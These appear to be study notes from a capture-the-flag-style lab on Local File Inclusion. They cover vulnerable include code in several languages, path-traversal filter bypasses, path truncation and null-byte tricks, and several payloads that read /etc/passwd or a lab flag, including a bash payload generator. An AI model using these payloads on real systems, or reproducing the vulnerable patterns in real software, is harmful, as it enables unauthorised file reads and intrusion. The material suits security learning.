```
PHP Code:

if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

```
NodeJS

if(req.query.language) { 
	fs.readFile(path.join(__dirname, req.query.language), 
function (err, data) { 
	res.write(data); 
	}); 
}
```

```
Express.js

app.get("/about/:language", function(req, res) {   
	res.render(`/${req.params.language}/about.html`); 
});
```

```
Java with include function:

<c:if test="${not empty param.language}"> 
	<jsp:include file="<%= request.getParameter('language') %>" 
/> 
</c:if>
```

```
Java with import function
<c:import url= "<%= request.getParameter('language') %>"/>
```

```
.NET with Response.WriteFile function

@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) { 
	<% Response.WriteFile("<% 
HttpContext.Request.Query['language'] %>"); %> 
}
```

```
.NET with @Html.Partial() function

@Html.Partial(HttpContext.Request.Query['language'])
```

```
.NET with include function

<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|

```
Note: If it vulnerable to LFI we can use: (../) many time if we don't want to guessing, it work it doesn't affect anything or sometime use with (/../) because some code contain (_) before filter so add (/) to bypass this.
```

```
$language = str_replace('../', '', $_GET['language']);
```

```
Bypass: ....// (cuz some code may filter ../ this so we put ....// it like substract so it still ../ like before. 

Other: ..././, ...\/, or url encode (In url encode must encode dot also)

We can use Burp Decoder to encoded, sometime use double encoded to bypass the filters.
```

```
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {                        include($_GET['language']); 
} else {     
	echo 'Illegal path specified!'; 
}

Bypass aprroved path: ./languages/../../../../etc/passwd

Sometime we need to put the aprroved path of the code to read the file like above
```


**Path Truncation Tehnique (PHP Bypass version <5.3/5.4)**

```
include($_GET['language'] . ".php");
```

```
PHP had a maximum path length of 4096 characters.
If the path became longer than 4096 characters:
 - PHP cut off the extra part
 - Anything after 4096 chars got ignored

So we try to make the strings so long so that .php gets cut off (truncated)
```

```
You send:

?language=../../../etc/passwd

Server becomes:

include("../../../etc/passwd.php")

So, when we want to bypass this, here is the payload:

?language=non_existing_directory/../../../etc/passwd/././././././././... (more)

And why (./) because it means current directory, so it changes nothing, so it just filter to increase length.

Example: 
/etc/passwd
/etc/passwd/./././
/etc/./passwd
////etc////passwd

And why (non_existing_directory/) at the begining becausse PHP cleaned paths strangely in old versions.

Example:

You send: non_existing_directory/../../../etc/passwd

Server send: /etc/passwd

```


```
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

```
#!/bin/bash

# Lab target URL
TARGET="http://localhost/index.php?language="

# Number of ./ repetitions
COUNT=${1:-2048}

BASE="non_existing_directory/../../../etc/passwd/"

PAYLOAD="$BASE"

for ((i=1; i<=COUNT; i++)); do
    PAYLOAD+="./"
done

echo "${TARGET}${PAYLOAD}"
```

**Null Bytes**

```
PHP versions before 5.5 were vulnerable to null byte injections

Example:

You send: /etc/passwd%00 even it end with .php the server only see if it null bytes, after that it become truncated so it still become /etc/passwd
```

```
http://154.57.164.76:31499/index.php?language=languages//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//flag.txt
```

